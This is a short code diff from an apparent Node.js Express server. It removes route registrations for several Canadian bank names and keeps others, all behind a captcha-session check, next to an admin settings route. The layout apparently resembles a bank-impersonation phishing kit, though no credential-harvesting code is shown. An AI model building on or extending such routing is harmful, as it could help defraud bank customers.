@@ -438,20 +438,9 @@ app.get('/admin/settings', checkAdminSession, async (req, res) => {
     }
 });
 
-app.use('/atb', checkRecaptchaSession,atb)
 app.use('/bmo', checkRecaptchaSession,bmo)
-app.use('/cibc', checkRecaptchaSession,cibc)
-app.use('/desj', checkRecaptchaSession,desj)
-app.use('/hsbc', checkRecaptchaSession,hsbc)
-app.use('/laur', checkRecaptchaSession,laur)
-app.use('/manu', checkRecaptchaSession,manu)
-app.use('/meridian', checkRecaptchaSession,meridian)
-app.use('/motus', checkRecaptchaSession,motus)
 app.use('/scotia', checkRecaptchaSession,scotia)
 app.use('/nbc', checkRecaptchaSession,nbc)
-app.use('/pc', checkRecaptchaSession,pc)
-app.use('/rbc', checkRecaptchaSession,rbc)
-app.use('/simplii', checkRecaptchaSession,simplii)
 app.use('/tangerine', checkRecaptchaSession,tangerine)
 app.use('/td', checkRecaptchaSession,td)
 
